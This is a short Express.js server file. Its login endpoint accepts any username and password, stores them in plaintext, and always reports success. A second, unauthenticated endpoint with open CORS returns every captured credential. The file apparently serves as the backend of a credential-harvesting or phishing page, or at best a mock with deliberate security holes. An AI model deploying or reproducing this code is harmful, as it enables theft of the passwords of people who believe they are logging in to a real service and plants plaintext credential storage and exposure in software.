// index.js
const express = require("express");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// In‑memory array to store all login attempts
const users = [];

// GET /user → return all stored users
app.get("/user", (req, res) => {
  res.json(users);
});

// POST /api/login → accept any credentials, store them, always succeed
app.post("/api/login", (req, res) => {
  const { identifier, password } = req.body;

  // Push new record into users array
  users.push({
    id: users.length + 1,
    identifier: identifier.trim(),
    password: password.trim(),
    timestamp: new Date().toISOString(),
  });

  // Always return success
  res.json({ message: "Login successful" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
